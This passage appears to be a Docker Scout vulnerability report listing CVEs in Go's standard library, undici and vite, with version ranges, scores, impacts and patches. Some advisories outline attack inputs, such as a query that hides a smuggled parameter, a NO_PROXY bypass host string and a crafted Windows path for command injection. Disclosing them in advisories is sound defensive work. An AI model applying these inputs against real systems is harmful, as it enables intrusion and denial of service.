<a href="https://scout.docker.com/v/CVE-2026-39825?s=golang&n=stdlib&t=golang&vr=%3C1.25.10"><img alt="medium : CVE--2026--39825" src="https://img.shields.io/badge/CVE--2026--39825-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.10</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.10</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.390%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>34th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ReverseProxy can forward queries containing parameters not visible to Rewrite functions.

When used with a Rewrite function, or a Director function which parses query parameters, ReverseProxy sanitizes the forwarded request to remove query parameters which are not parsed by url.ParseQuery. ReverseProxy does not take ParseQuery's limit on the total number of query parameters (controlled by GODEBUG=urlmaxqueryparams=N) into account. This can permit ReverseProxy to forward a request containing a query parameter that is not visible to the Rewrite function.

For example, the query "a1=x&a2=x&...&a10000=x&hidden=y" can forward the parameter "hidden=y" while hiding it from the proxy's Rewrite function.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61730?s=golang&n=stdlib&t=golang&vr=%3C1.24.12"><img alt="medium : CVE--2025--61730" src="https://img.shields.io/badge/CVE--2025--61730-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.12</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.12</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.324%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>26th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

During the TLS 1.3 handshake if multiple messages are sent in records that span encryption level boundaries (for instance the Client Hello and Encrypted Extensions messages), the subsequent messages may be processed before the encryption level changes. This can cause some minor information disclosure if a network-local attacker can inject messages during the handshake.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61724?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--61724" src="https://img.shields.io/badge/CVE--2025--61724-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.556%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>47th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The Reader.ReadResponse function constructs a response string through repeated string concatenation of lines. When the number of lines in a response is large, this can cause excessive CPU consumption.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58189?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--58189" src="https://img.shields.io/badge/CVE--2025--58189-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.468%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>41st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When Conn.Handshake fails during ALPN negotiation the error contains attacker controlled information (the ALPN protocols sent by the client) which is not escaped.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58186?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--58186" src="https://img.shields.io/badge/CVE--2025--58186-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.565%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>47th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Despite HTTP headers having a default limit of 1MB, the number of cookies that can be parsed does not have a limit. By sending a lot of very small cookies such as "a=;", an attacker can make an HTTP server allocate a large amount of structs, causing large memory consumption.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58185?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--58185" src="https://img.shields.io/badge/CVE--2025--58185-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.556%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>47th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Parsing a maliciously crafted DER payload could allocate large amounts of memory, causing memory exhaustion.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-47912?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--47912" src="https://img.shields.io/badge/CVE--2025--47912-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.468%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>41st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The Parse function permits values other than IPv6 addresses to be included in square brackets within the host component of a URL. RFC 3986 permits IPv6 addresses to be included within the host component, enclosed within square brackets. For example: "http://[::1]/". IPv4 addresses and hostnames must not appear within square brackets. Parse did not enforce this requirement.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-45284?s=golang&n=stdlib&t=golang&vr=%3C1.20.11"><img alt="medium : CVE--2023--45284" src="https://img.shields.io/badge/CVE--2023--45284-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.20.11</code></td></tr>
<tr><td>Fixed version</td><td><code>1.20.11</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.096%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>66th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

On Windows, The IsLocal function does not correctly detect reserved device names in some cases.

Reserved names followed by spaces, such as "COM1 ", and reserved names "COM" and "LPT" followed by superscript 1, 2, or 3, are incorrectly reported as local.

With fix, IsLocal now correctly reports these names as non-local.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-39326?s=golang&n=stdlib&t=golang&vr=%3C1.20.12"><img alt="medium : CVE--2023--39326" src="https://img.shields.io/badge/CVE--2023--39326-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.20.12</code></td></tr>
<tr><td>Fixed version</td><td><code>1.20.12</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.208%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>69th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A malicious HTTP sender can use chunk extensions to cause a receiver reading from a request or response body to read many more bytes from the network than are in the body.

A malicious HTTP client can further exploit this to cause a server to automatically read a large amount of data (up to about 1GiB) when a handler fails to read the entire body of a request.

Chunk extensions are a little-used HTTP feature which permit including additional metadata in a request or response body sent using the chunked encoding. The net/http chunked encoding reader discards this metadata. A sender can exploit this by inserting a large metadata segment with each byte transferred. The chunk reader now produces an error if the ratio of real body to encoded bytes grows too small.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-22870?s=golang&n=stdlib&t=golang&vr=%3C1.23.7"><img alt="medium : CVE--2025--22870" src="https://img.shields.io/badge/CVE--2025--22870-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.23.7</code></td></tr>
<tr><td>Fixed version</td><td><code>1.23.7</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.425%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>37th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Matching of hosts against proxy patterns can improperly treat an IPv6 zone ID as a hostname component. For example, when the NO_PROXY environment variable is set to "*.example.com", a request to "[::1%25.example.com]:80` will incorrectly match and not be proxied.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58183?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--58183" src="https://img.shields.io/badge/CVE--2025--58183-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.443%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>39th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

tar.Reader does not set a maximum size on the number of sparse region data blocks in GNU tar pax 1.0 sparse files. A maliciously-crafted archive containing a large number of sparse regions can cause a Reader to read an unbounded amount of data from the archive into memory. When reading from a compressed source, a small compressed input can result in large allocations.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-34155?s=golang&n=stdlib&t=golang&vr=%3C1.22.7"><img alt="medium : CVE--2024--34155" src="https://img.shields.io/badge/CVE--2024--34155-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.22.7</code></td></tr>
<tr><td>Fixed version</td><td><code>1.22.7</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.839%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>58th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Calling any of the Parse functions on Go source code which contains deeply nested literals can cause a panic due to stack exhaustion.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-45289?s=golang&n=stdlib&t=golang&vr=%3C1.21.8"><img alt="medium : CVE--2023--45289" src="https://img.shields.io/badge/CVE--2023--45289-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.21.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.21.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.080%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>66th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When following an HTTP redirect to a domain which is not a subdomain match or exact match of the initial domain, an http.Client does not forward sensitive headers such as "Authorization" or "Cookie". For example, a redirect from foo.com to www.foo.com will forward the Authorization header, but a redirect to bar.com will not.

A maliciously crafted HTTP redirect could cause sensitive headers to be unexpectedly forwarded.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-22866?s=golang&n=stdlib&t=golang&vr=%3C1.22.12"><img alt="medium : CVE--2025--22866" src="https://img.shields.io/badge/CVE--2025--22866-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.22.12</code></td></tr>
<tr><td>Fixed version</td><td><code>1.22.12</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.290%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Due to the usage of a variable time instruction in the assembly implementation of an internal function, a small number of bits of secret scalars are leaked on the ppc64le architecture. Due to the way this function is used, we do not believe this leakage is enough to allow recovery of the private key when P-256 is used in any well known protocols.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-22873?s=golang&n=stdlib&t=golang&vr=%3C1.23.9"><img alt="low : CVE--2025--22873" src="https://img.shields.io/badge/CVE--2025--22873-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.23.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.23.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.233%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>14th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

It was possible to improperly access the parent directory of an os.Root by opening a filename ending in "../". For example, Root.Open("../") would open the parent directory of the Root. This escape only permits opening the parent directory itself, not ancestors of the parent or files contained within the parent.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-27139?s=golang&n=stdlib&t=golang&vr=%3C1.25.8"><img alt="low : CVE--2026--27139" src="https://img.shields.io/badge/CVE--2026--27139-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.219%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>13th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

On Unix platforms, when listing the contents of a directory using File.ReadDir or File.Readdir the returned FileInfo could reference a file outside of the Root in which the File was opened.

The impact of this escape is limited to reading metadata provided by lstat from arbitrary locations on the filesystem without permitting reading or writing files outside the root.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-97054?s=golang&n=stdlib&t=golang&vr=%3C1.26.11"><img alt="unspecified : CVE--2026--97054" src="https://img.shields.io/badge/CVE--2026--97054-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.26.11</code></td></tr>
<tr><td>Fixed version</td><td><code>1.26.11</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.171%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

For HTTP/1 servers, when MaxBytesReader's limit is exceeded, "Connection: close" header is automatically set without synchronization, which might race with another header being set explicitly in the server handler. As a result, an HTTP/1 server that utilizes MaxBytesReader or MaxBytesHandler can crash due to runtime panic if its handler reads the request body concurrently with writing the response header.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 4" src="https://img.shields.io/badge/H-4-e25d68"/> <img alt="medium: 3" src="https://img.shields.io/badge/M-3-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>undici</strong> <code>6.28.0</code> (npm)</summary>

<small><code>pkg:npm/undici@6.28.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-87018?s=github&n=undici&t=npm&vr=%3E%3D4.2.1%2C%3C6.29.1"><img alt="high 7.5: CVE--2026--87018" src="https://img.shields.io/badge/CVE--2026--87018-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Uncaught Exception</i>

<table>
<tr><td>Affected range</td><td><code>>=4.2.1<br/><6.29.1</code></td></tr>
<tr><td>Fixed version</td><td><code>6.29.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.187%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Impact

undici crashes the client process when a TLS 1.2 server renegotiates after the connection is established and presents a different, CA-trusted certificate whose hostname does not match the requested host. Node.js re-runs hostname verification on the renegotiated handshake and destroys the socket with `ERR_TLS_CERT_ALTNAME_INVALID`. undici's established socket error handler asserted that this error code could never occur, so the peer-controlled error became an uncaught `AssertionError` that terminates the Node.js process. Both the HTTP/1.1 and HTTP/2 paths are affected.

A malicious or compromised HTTPS endpoint reached through undici or the global `fetch()` can crash the client with a single server-initiated renegotiation, taking down all in-flight requests and background work in the process. Only TLS 1.2 is affected, because TLS 1.3 does not support renegotiation. Exploitation does not require a CA compromise: the attacker controls the endpoint and can present two ordinary valid certificates, the first matching the requested URL and the second intentionally not matching it.

## Patches

Upgrade to undici 6.29.1, 7.30.1, or 8.12.2.

## Workarounds

Restrict outbound connections to TLS 1.3, for example by setting `connect: { minVersion: 'TLSv1.3', maxVersion: 'TLSv1.3' }` on the client or agent, so that renegotiation cannot occur, when the target endpoints support TLS 1.3.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-19534?s=github&n=undici&t=npm&vr=%3E%3D6.7.0%2C%3C6.28.1"><img alt="high 7.5: CVE--2026--19534" src="https://img.shields.io/badge/CVE--2026--19534-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Uncaught Exception</i>

<table>
<tr><td>Affected range</td><td><code>>=6.7.0<br/><6.28.1</code></td></tr>
<tr><td>Fixed version</td><td><code>6.28.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.394%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>34th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

The undici WebSocket client throws an uncaught `TypeError` during the opening handshake when a server's `101` response includes a `Sec-WebSocket-Protocol` header that the client never requested. The throw occurs in a `queueMicrotask` callback with no surrounding `try`/`catch`, so it propagates as an uncaught exception and terminates the Node.js process. This is a remote, unauthenticated denial of service against any application that opens a WebSocket to an attacker controlled or compromised server, or over a plaintext `ws://` connection subject to a machine-in-the-middle. It affects the default `new WebSocket(url)` usage, where no subprotocol is requested. Per RFC 6455 section 4.1, an unrequested subprotocol must fail the connection, not crash it.

All releases starting at undici 6.7.0 are affected.

### Patches

Upgrade to undici 6.28.1, 7.29.1, or 8.10.2.

### Workarounds

No workaround is available. The fix must be applied through an upgrade.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-109869?s=github&n=undici&t=npm&vr=%3E%3D6.23.0%2C%3C6.29.1"><img alt="high 7.5: CVE--2026--109869" src="https://img.shields.io/badge/CVE--2026--109869-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Uncaught Exception</i>

<table>
<tr><td>Affected range</td><td><code>>=6.23.0<br/><6.29.1</code></td></tr>
<tr><td>Fixed version</td><td><code>6.29.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.344%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>28th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

undici's `fetch()` crashes the Node.js process when a malicious server returns a response with more than five content codings and closes the connection before sending the body. undici rejects such responses (a content-encoding limit), but it created the internal response stream before that check and returned without attaching an error listener or aborting the request. The early close then surfaces a content-length mismatch on that orphaned internal stream, which Node.js treats as an unhandled `error` and terminates the process. A remote, unauthenticated server can trigger this with a single response, even when the application correctly catches the `fetch()` rejection. undici 6.x, 7.x, and 8.x are affected.

### Patches

Upgrade to `6.29.1`, `7.30.1`, or `8.12.2`. undici now validates the content-encoding chain before creating the internal body stream and aborts the response when the limit is exceeded, so no error can surface on an orphaned stream.

### Workarounds

None.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-109383?s=github&n=undici&t=npm&vr=%3E%3D4.0.0%2C%3C6.29.1"><img alt="high 7.4: CVE--2026--109383" src="https://img.shields.io/badge/CVE--2026--109383-lightgrey?label=high%207.4&labelColor=e25d68"/></a> <i>Improper Certificate Validation</i>

<table>
<tr><td>Affected range</td><td><code>>=4.0.0<br/><6.29.1</code></td></tr>
<tr><td>Fixed version</td><td><code>6.29.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.4</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.184%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

undici's `Agent` passes its constructor options through a JSON-based deep clone (`JSON.parse(JSON.stringify(...))`) before forwarding them to each per-origin `Pool`. JSON cannot represent functions, so a caller-supplied `tls` option containing a `checkServerIdentity` callback is silently dropped before it reaches the TLS layer. As a result, a TLS peer whose certificate a custom `checkServerIdentity` was written to reject, but which passes Node's default hostname and chain checks, is silently accepted when the request is made through `Agent`. Because `Agent` is the default dispatcher behind `request`, `fetch`, and `setGlobalDispatcher`, this is the path most applications use. `EnvHttpProxyAgent` is also affected on its direct and `NO_PROXY` routes, which delegate to an internal `Agent`.

Only applications that pass a function-valued `tls` option (such as a custom `checkServerIdentity` for certificate or public-key pinning) are affected. Passing the same options through `connect` is not affected. This is the `Agent` counterpart of the `BalancedPool` certificate validation bypass fixed in CVE-2026-84961.

### Patches

Upgrade to undici `6.29.1`, `7.30.1`, or `8.12.2`. `Agent` now preserves the `tls` option outside the JSON clone, so custom TLS verification callbacks are forwarded to each origin unchanged.

### Workarounds

Pass the TLS options through `connect` instead of `tls`. For proxied `EnvHttpProxyAgent` destinations, use `requestTls` / `proxyTls`.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-85024?s=github&n=undici&t=npm&vr=%3E%3D6.25.0%2C%3C6.28.1"><img alt="medium 5.9: CVE--2026--85024" src="https://img.shields.io/badge/CVE--2026--85024-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>Uncaught Exception</i>

<table>
<tr><td>Affected range</td><td><code>>=6.25.0<br/><6.28.1</code></td></tr>
<tr><td>Fixed version</td><td><code>6.28.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.412%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>36th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Impact

undici's WebSocket client (including Node.js's bundled `globalThis.WebSocket`) crashes the entire Node.js process when a remote WebSocket peer sends a permessage-deflate compressed message that crosses the decompressed-payload size limit and then contains a malformed DEFLATE block. In `lib/web/websocket/permessage-deflate.js`, the size-limit cleanup calls `removeAllListeners()` on the internal zlib `InflateRaw`, removing its `error` listener, but leaves the stream running. The inflater then emits a `Z_DATA_ERROR` with no listener attached, which Node.js treats as a fatal unhandled `error` event and terminates the process. Application `error`/`close` handlers on the public WebSocket cannot observe or prevent this, because the failing object is the internal `InflateRaw`.

A malicious or compromised WebSocket server can crash a client with a single connection, unauthenticated and without any application mistake. The attack is asymmetric (about 130 KB on the wire expands past the limit) and can be repeated on reconnect (crash loop).

Affected applications are those using the undici WebSocket client (`new WebSocket(...)`) or Node.js's bundled `globalThis.WebSocket` that can be induced to connect to an attacker-controlled or compromised WebSocket endpoint.

## Patches

Upgrade to undici v6.28.1, v7.29.1 or v8.10.2.

## Workarounds

No workaround is available.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-109932?s=github&n=undici&t=npm&vr=%3E%3D5.15.0%2C%3C6.29.1"><img alt="medium 5.9: CVE--2026--109932" src="https://img.shields.io/badge/CVE--2026--109932-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code>>=5.15.0<br/><6.29.1</code></td></tr>
<tr><td>Fixed version</td><td><code>6.29.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.321%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

undici's WebSocket client (including Node.js's bundled `globalThis.WebSocket`) can be driven to exhaust process memory by a malicious or compromised WebSocket server. For every PING frame received, the receiver automatically writes a PONG response to the socket and ignores the `false` return value from `socket.write()`, which is a backpressure signal, so a server that streams small PING frames while never reading the client's PONGs makes the outbound write queue and heap grow without bound until the Node.js process runs out of memory and terminates. The attack is remote and unauthenticated, needs only a normal WebSocket connection, and is asymmetric: small inbound PINGs produce a much larger retained outbound queue. Availability is the only impact. undici 5.x, 6.x, 7.x, and 8.x are affected; the WebSocket client was introduced in 5.15.0.

### Patches

Upgrade to `6.29.1`, `7.30.1`, or `8.12.2`, which pause WebSocket frame parsing when the automatic PONG response hits socket backpressure and resume on drain, bounding the outbound queue.

### Workarounds

None.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-109924?s=github&n=undici&t=npm&vr=%3E%3D6.5.0%2C%3C6.29.1"><img alt="medium 5.9: CVE--2026--109924" src="https://img.shields.io/badge/CVE--2026--109924-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>Allocation of Resources Without Limits or Throttling</i>

<table>
<tr><td>Affected range</td><td><code>>=6.5.0<br/><6.29.1</code></td></tr>
<tr><td>Fixed version</td><td><code>6.29.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.321%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

undici's `EventSource` client can be driven to exhaust process memory by a malicious or compromised Server-Sent Events peer. By sending millions of tiny completed `data:` fields with no blank event separator, or a single unfinished line split across many chunks, the parser retains a growing amount of per-field and per-chunk state. The byte-based `maxEventSize` and `maxResponseSize` limits do not bound that retained state, and `maxResponseSize` is enforced on the compressed body before decompression, so a small compressed response can expand into enough retained memory to terminate the process. The application only needs to maintain an `EventSource` connection to an untrusted peer, which controls only the response. Availability is the only impact.

### Patches

Upgrade to `6.29.1`, `7.30.1`, or `8.12.2`, which bound the retained EventSource parser state (the number of `data` fields and buffered chunks, the unfinished-line length, and per-field byte totals) independently of the byte limits.

### Workarounds

None.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-18540?s=github&n=undici&t=npm&vr=%3C6.28.1"><img alt="low 3.7: CVE--2026--18540" src="https://img.shields.io/badge/CVE--2026--18540-lightgrey?label=low%203.7&labelColor=fce1a9"/></a> <i>Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')</i>

<table>
<tr><td>Affected range</td><td><code><6.28.1</code></td></tr>
<tr><td>Fixed version</td><td><code>6.28.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>3.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.309%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>24th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

Undici's `interceptors.retry()` can resume a request after a partial response and append the resumed bytes to an already partially delivered body, while the application still receives the original response's status and headers. When that response carried a `Content-Length`, the application can receive a longer body. Applications that forward Undici's status, headers, and body downstream without recalculating framing, for example proxy or gateway applications, may emit a response whose body exceeds the forwarded `Content-Length`, and the excess bytes can be read as the start of a subsequent HTTP response (downstream response splitting or desynchronization).

For example, a `404 Not Found` with `Content-Length: 2` that sends one byte then closes can be resumed with an open-ended `Range` request, and the resumed `206 Partial Content` bytes are appended, so the application receives more than two body bytes while still seeing `Content-Length: 2`. The bug requires `interceptors.retry()` enabled, an attacker-controlled or faulty upstream, and a downstream forwarder that does not recalculate `Content-Length`.

### Patches

Patched in undici v6.28.1, v7.29.1, and v8.10.2. Upgrade to one of these or later.

### Workarounds

- Disable `interceptors.retry()` for untrusted upstreams, or set `maxRetries: 0`.
- Remove or recalculate `Content-Length` before forwarding a response body assembled by Undici.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 3" src="https://img.shields.io/badge/H-3-e25d68"/> <img alt="medium: 17" src="https://img.shields.io/badge/M-17-fbb552"/> <img alt="low: 3" src="https://img.shields.io/badge/L-3-fce1a9"/> <img alt="unspecified: 1" src="https://img.shields.io/badge/U-1-lightgrey"/><strong>vite</strong> <code>4.4.9</code> (npm)</summary>

<small><code>pkg:npm/vite@4.4.9</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-112942?s=github&n=vite&t=npm&vr=%3C%3D6.4.3"><img alt="high 7.5: CVE--2026--112942" src="https://img.shields.io/badge/CVE--2026--112942-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Improper Neutralization of Special Elements used in a Command ('Command Injection')</i>

<table>
<tr><td>Affected range</td><td><code><=6.4.3</code></td></tr>
<tr><td>Fixed version</td><td><code>6.4.4</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.694%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>78th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

`launch-editor` checked `fs.existsSync(fileName)` before passing a supplied path to an editor command. On Windows, an attacker can bypass this check with a crafted path ending in `\\..:line:column`. This removes the requirement that the attacker be able to place a file with a malicious filename.

